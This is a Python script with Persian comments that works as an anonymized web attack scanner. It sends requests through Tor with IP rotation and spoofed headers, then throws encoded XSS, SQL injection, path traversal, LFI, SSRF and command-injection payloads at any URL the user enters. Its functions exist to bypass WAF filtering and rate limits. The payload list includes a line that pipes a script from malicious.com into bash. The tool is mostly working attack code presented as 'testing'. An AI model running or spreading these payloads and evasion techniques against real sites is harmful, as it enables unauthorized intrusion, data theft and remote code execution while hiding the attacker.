import requests
import base64
import time
import random
import binascii
from urllib.parse import urlparse, parse_qs, urlencode
from stem import Signal
from stem.control import Controller
from fake_useragent import UserAgent

# 🔹 تنظیمات Tor Proxy برای مخفی کردن IP
TOR_PROXY = "socks5h://127.0.0.1:9050"
session = requests.Session()
session.proxies = {
    "http": TOR_PROXY,
    "https": TOR_PROXY,
}
session.headers.update({"User-Agent": UserAgent().random})

# 🔹 تغییر IP از طریق Tor
def change_tor_ip():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
        print("✅ IP جدید از طریق Tor تنظیم شد.")
    except Exception as e:
        print(f"❌ خطا در تغییر IP: {e}")

# 🔹 متدهای مختلف برای ارسال درخواست‌ها
HTTP_METHODS = ["GET", "POST", "HEAD", "PUT", "DELETE"]

# 🔹 رمزگذاری‌های پیشرفته برای بایپس WAF
def encode_payloads(payload):
    encodings = {
        "Base64": base64.b64encode(payload.encode()).decode(),
        "Hex": binascii.hexlify(payload.encode()).decode(),
        "URL": urlencode({"data": payload})[5:],
        "Reversed": payload[::-1],  
        "Unicode": payload.encode("unicode_escape").decode(),  
        "Double URL": urlencode({"data": urlencode({"data": payload})})[5:],
        "HTML Entities": "".join(f"&#{ord(char)};" for char in payload)  # تبدیل به HTML Entities
    }
    return encodings

# 🔹 Payloadهای پیشرفته برای تست WAF
advanced_payloads = {
    "XSS": [
        "<script>alert(1)</script>",
        "\"'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        base64.b64encode(b"<script>alert(1)</script>").decode(),
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",  # Unicode Encoding
        "<img src='x' onerror='alert(1)'>",  # Single Quotes
        "<img src=x onerror=alert`1`>",  # Backticks
        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>"  # CharCode
    ],
    "SQLI": [
        "' OR '1'='1' --",
        "' UNION SELECT null, username, password FROM users --",
        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
        "1' AND SLEEP(5) --",
        "/*!50000SELECT*/ username, password FROM users",
        "1' OR '1'='1' /*",  # Comment-based SQLi
        "1' OR '1'='1' #",  # Hash-based SQLi
        "1' OR '1'='1' -- -"  # Double Dash SQLi
    ],
    "Directory Traversal": [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "/../../../../../../../../etc/shadow",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"  # URL Encoding
    ],
    "LFI": [
        "../../../../etc/passwd",
        "../../../../var/log/apache2/access.log",
        "php://filter/convert.base64-encode/resource=index.php",
        "/proc/self/environ",
        "....//....//....//etc/passwd"  # Path Traversal with Double Dots
    ],
    "SSRF": [
        "http://127.0.0.1:8080/admin",
        "http://169.254.169.254/latest/meta-data/",
        "http://internal.company.com/",
        "http://localhost:8000/",
        "file:///etc/passwd"  # File Protocol
    ],
    "RCE": [
        "`id`",
        ";id;",
        "`cat /etc/passwd`",
        "`ls -la /var/www/html`",
        ";curl http://malicious.com/rev.sh | bash;",
        "|id",  # Pipe-based RCE
        "$(id)"  # Command Substitution
    ]
}

# 🔹 بررسی در دسترس بودن سایت
def check_site_availability(url):
    try:
        response = session.get(url, timeout=10)
        if response.status_code == 200:
            print("✅ سایت در دسترس است.")
            return True
        else:
            print(f"⚠️ سایت پاسخگو نیست. کد وضعیت: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"❌ سایت در دسترس نیست. خطا: {e}")
        return False

# 🔹 تست حملات پیشرفته برای دور زدن WAF
def test_waf_bypass(url):
    if not url.startswith("http"):
        url = "https://" + url

    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    if not query_params:
        print(f"⚠️ این URL هیچ پارامتری ندارد. اضافه کردن پارامتر پیش‌فرض `?test=1` برای تست ...")
        url += "?test=1"
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

    print(f"🔍 شروع تست پیشرفته برای عبور از WAF در {url} ...")

    if not check_site_availability(url):
        print("❌ عملیات متوقف شد. سایت در دسترس نیست.")
        return

    for attack, values in advanced_payloads.items():
        print(f"\n🚀 تست {attack} با بایپس WAF ...")
        for payload in values:
            encoded_versions = encode_payloads(payload)

            for encoding, encoded_payload in encoded_versions.items():
                for param in query_params.keys():
                    temp_params = query_params.copy()
                    temp_params[param] = encoded_payload
                    new_query = urlencode(temp_params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"

                    # انتخاب متد تصادفی برای ارسال درخواست
                    method = random.choice(HTTP_METHODS)

                    # تنظیم هدرهای خاص برای بایپس WAF
                    headers = {
                        "User-Agent": UserAgent().random,
                        "Referer": "https://trusted-site.com",
                        "X-Forwarded-For": "127.0.0.1",
                        "X-Originating-IP": "127.0.0.1",
                        "Accept": "application/json, text/javascript, */*; q=0.01",
                        "Content-Type": "application/x-www-form-urlencoded"
                    }

                    # اضافه کردن تاخیر تصادفی برای عبور از Rate Limiting
                    time.sleep(random.uniform(2, 5))

                    try:
                        if method == "POST":
                            response = session.post(test_url, headers=headers, data=temp_params, timeout=10)
                        else:
                            response = session.get(test_url, headers=headers, timeout=10)

                        if payload in response.text:
                            print(f"⚠️ آسیب‌پذیری {attack} شناسایی شد! ({encoding} - {method}) 🔥 {test_url}")
                        elif response.status_code == 403:
                            print(f"⚠️ احتمالاً WAF درخواست {attack} را بلاک کرده است ({encoding}).")
                        else:
                            print(f"✅ سایت در برابر {attack} مقاوم است ({encoding}).")

                    except requests.exceptions.RequestException as e:
                        print(f"❌ امکان بررسی {attack} وجود ندارد. خطا: {e}")

# 🔹 اجرای تست
if __name__ == "__main__":
    change_tor_ip()
    target_url = input("🔹 URL سایت موردنظر را وارد کنید (مثال: https://example.com/search?q=test): ")
    test_waf_bypass(target_url)